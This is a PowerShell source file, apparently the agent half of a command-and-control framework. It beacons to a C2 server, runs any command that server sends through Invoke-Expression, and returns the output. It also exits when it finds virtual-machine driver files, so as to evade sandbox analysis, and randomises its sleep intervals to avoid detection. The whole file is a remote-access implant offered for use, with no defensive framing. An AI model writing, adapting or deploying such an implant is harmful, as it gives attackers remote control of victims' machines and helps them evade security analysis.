######################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

# Agent Script (agent.ps1)
$C2Server = "http://192.168.1.100"  # Replace with the IP address of your C2 server
$AgentID = [guid]::NewGuid().ToString()

# Encrypt communication with the C2 server
Function Encrypt-Data {
    param (
        [string]$Data
    )
    $Key = (Get-Content "C:\path\to\encryption_key.txt")
    $Bytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
    $EncryptedBytes = [System.Security.Cryptography.ProtectedData]::Protect($Bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    return [Convert]::ToBase64String($EncryptedBytes)
}

# Decrypt communication from the C2 server
Function Decrypt-Data {
    param (
        [string]$Data
    )
    $Key = (Get-Content "C:\path\to\encryption_key.txt")
    $Bytes = [Convert]::FromBase64String($Data)
    $DecryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($Bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    return [System.Text.Encoding]::UTF8.GetString($DecryptedBytes)
}

Function Write-Log {
    param (
        [string]$Message,
        [string]$Color = "White"
    )
    Write-Host $Message -ForegroundColor $Color
}

Function Send-Data {
    param (
        [string]$Endpoint,
        [hashtable]$Data
    )
    $DataJson = $Data | ConvertTo-Json
    $EncryptedData = Encrypt-Data $DataJson
    $Url = "$C2Server/$Endpoint"
    $Response = Invoke-RestMethod -Uri $Url -Method Post -Body $EncryptedData -ContentType "application/json"
    return Decrypt-Data $Response
}

Function Execute-Command {
    param (
        [string]$Command
    )
    Write-Log "Executing command: $Command"
    try {
        $Result = Invoke-Expression $Command
        return $Result
    } catch {
        return $_.Exception.Message
    }
}

Function Check-Sandbox {
    # Check for common sandbox artifacts
    $sandbox_indicators = @("C:\Windows\System32\drivers\VBoxMouse.sys", "C:\Windows\System32\drivers\vmhgfs.sys")
    foreach ($indicator in $sandbox_indicators) {
        if (Test-Path $indicator) {
            Write-Log "Sandbox detected: $indicator" "Red"
            Exit
        }
    }
}

Function PolymorphicSleep {
    # Generate a polymorphic sleep interval
    $interval = Get-Random -Minimum 10 -Maximum 60
    Start-Sleep -Seconds $interval
}

Function Main {
    Write-Log "Agent started. ID: $AgentID" "Cyan"
    Check-Sandbox
    while ($true) {
        $Response = Send-Data "checkin" @{ "AgentID" = $AgentID }
        if ($Response.Command) {
            $Result = Execute-Command $Response.Command
            Send-Data "result" @{ "AgentID" = $AgentID; "Result" = $Result }
        }
        PolymorphicSleep
    }
}

Main
